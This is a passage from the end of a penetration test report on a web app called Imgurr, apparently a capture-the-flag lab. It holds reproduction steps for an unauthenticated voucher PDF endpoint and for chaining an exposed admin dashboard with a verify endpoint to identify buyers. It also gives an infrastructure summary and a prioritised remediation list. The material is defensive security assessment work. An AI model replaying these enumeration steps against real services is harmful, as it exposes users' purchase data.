3. Send: `GET /api/vouchers/MWR-7DCF36074E4A98DD/pdf`
4. Response: `200 OK`, `Content-Type: application/pdf`, full PDF downloaded — confirmed with `file` command output showing a valid PDF structure.

**Business Impact:**

Low impact in isolation. However, if voucher codes are ever exposed through another channel (such as via the admin dashboard from Finding 4), unauthenticated PDF access would allow unauthorised users to access and potentially use others' vouchers.

**Screenshot References:**
- N/A

**Remediation:**

Require authentication on the voucher PDF endpoint and verify that the requesting user is the original purchaser of the voucher before serving the file. Alternatively, use short-lived, high-entropy signed URLs for PDF access that expire after a fixed period and are tied to the purchaser's session.

### Finding 16: Chained Data Exposure — Admin Dashboard and Purchase Verification

**Risk Rating:** Low

**Flag:** N/A

**Description:**

The unauthenticated admin dashboard (Finding 4) exposes `verification_hash` values for all recent orders. These hashes are submitted to the public, unauthenticated `GET /api/shop/verify/:hash` endpoint to resolve each one to a buyer username, the item purchased, the price paid, and the purchase timestamp. Neither endpoint requires authentication, enabling a full chain: anyone queries the dashboard, collects hashes, and identifies every recent buyer and their purchase history.

**Reproduction Steps:**

1. Call `GET /api/admin/dashboard` with no authentication. Collect `verification_hash` values from the `recent_orders` array.
2. For each hash, call: `GET /api/shop/verify/<hash>`
3. Response: `{"order":{"buyer_username":"cbrooks","image_id":107,"image_title":"Enjoy could","price_bucks":69,"purchased_at":"2026-09-07T04:14:26..."},"valid":true}`
4. Confirmed: hash `ceda4a6e...` from the dashboard resolved buyer ID 242 to username `cbrooks`, with full purchase details.

**Business Impact:**

Any member of the public can enumerate all recent buyers on the platform and link them to specific purchases. This is a breach of user privacy and a violation of data protection obligations including South Africa's Protection of Personal Information Act (POPIA) and the EU's GDPR.

**Screenshot References:**
- N/A

**Remediation:**

Secure the admin dashboard endpoint as described in Finding 4. Additionally, consider whether the verify endpoint should require authentication, or at minimum whether buyer usernames should be redacted from the public-facing certificate. Rate-limit the verify endpoint to prevent automated enumeration.

## Infrastructure Observations

The following information was gathered through the path traversal vulnerability (Finding 9) and the PHP execution sandbox (Finding 3). These observations provide a complete picture of the deployment context and were not exploited beyond what was needed to retrieve flag values.

| Observation | Detail |
|-------------|--------|
| Application user | `imgurr` (uid 996) |
| Download subprocess user | `imgurr-sandbox` (uid 995), invoked via `sudo /bin/cat -- <path>` |
| Application path | `/opt/imgurr/backend/` (confirmed via `mountinfo`) |
| Database engine | SQLite (from admin dashboard response) |
| Web server | nginx 1.24.0 (Ubuntu), proxying to application server on port 8000 |
| Internal open ports | 80 (web server), 8000 (application server), 36375 (unknown, root-owned) |
| RCE Sandbox 1 (ping) | Isolated container, loopback-only network, runs as `nobody`, `/flag.txt` present |
| RCE Sandbox 2 (PHP) | Alpine Linux, PHP 8.3.33, loopback-only network, runs as `nobody`, hostname `27eeb6c94711` |
| Docker socket | `/run/docker.sock` visible in process information but not readable by `imgurr-sandbox` |

## Conclusion

This assessment of the Imgurr web application identified **16 security vulnerabilities**, including three critical, five high, four medium, and two low severity findings. Ten of these were confirmed with flag values as proof of successful exploitation.

The application's security posture is not suitable for production deployment in its current state. The three critical vulnerabilities give an attacker the ability to take over any user account, execute arbitrary code on the server, and upload and execute malicious files. Several high-severity findings — particularly the client-side template injection via the bio field and the stored XSS via username — are trivially exploitable by anyone who registers an account.

**Top Priority Remediations (address before anything else):**

1. **Fix JWT authentication immediately (Finding 1)** — enable signature verification in the JWT library. This is the single most impactful fix as it underpins every other access control.
2. **Restrict file uploads to safe image types only (Finding 3)** — prevent PHP and any other executable file type from being stored or served.
3. **Sanitise all user input and use safe rendering patterns (Findings 6, 7, 8, 13)** — never use `innerHTML` with user-controlled values, and never pass user content to the template compiler.
4. **Authenticate and protect every admin endpoint (Findings 4, 5)** — implement centralised middleware that requires a valid session and CSRF token on all admin routes.
5. **Validate all numeric inputs server-side (Finding 11)** — enforce lower and upper bounds on all price fields at the point of creation, not just editing.

**Secondary Priorities:**

- Remove the deprecated `?filename=` parameter from the download endpoint (Finding 9).
- Rotate the default admin password and enforce a strong password policy (Finding 12).
- Enforce case-insensitive username uniqueness at registration (Finding 14).
- Sanitise seller application fields rendered in the admin panel (Finding 13).
- Authenticate the voucher PDF endpoint (Finding 15).

A follow-up assessment should be conducted after remediation to verify that all fixes are effective and have not introduced new issues. It is also recommended that the development team perform a broader review of all server-side input validation, as the concentration of input-handling vulnerabilities across multiple endpoints suggests validation was not applied systematically during development.

*End of Report*
